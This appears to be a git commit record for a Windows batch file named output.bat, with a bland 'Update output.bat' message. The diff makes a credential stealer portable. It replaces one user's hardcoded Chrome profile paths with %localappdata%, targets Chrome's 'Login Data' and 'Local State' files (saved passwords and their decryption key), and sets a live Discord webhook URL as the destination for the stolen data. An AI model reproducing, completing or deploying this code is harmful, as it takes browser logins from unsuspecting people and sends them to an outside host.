fdc6ac70bbdf45c2ac9d81465f81fdac5cd2c427
d2s6x0VwerWQFR2CcbeF1opLywWE <d2sWo6vH5p6x0V2CcbeF1opLywWE@gmail.com>
2024-06-01 12:46:59 -0700

    Update output.bat

--- output.bat
+++ output.bat
@@ -1,6 +1,6 @@
 @echo off
-set "sourceDir1=C:\Users\donot\AppData\Local\Google\Chrome\User Data\Default\"
-set "sourceDir2=C:\Users\donot\AppData\Local\Google\Chrome\User Data\"
+set "sourceDir1=%localappdata%\Google\Chrome\User Data\Default\"
+set "sourceDir2=%localappdata%\Google\Chrome\User Data\"
 set "fileName1=Login Data"
 set "fileName2=Local State"
 set "webhookUrl=https://discord.com/api/webhooks/1246527590026448926/LTvUJGS9xvGSiozP-8jr-BaRki98at9F_SngX_bdpasuTb_9_dmQTrhjLjtjWdMHejyT"
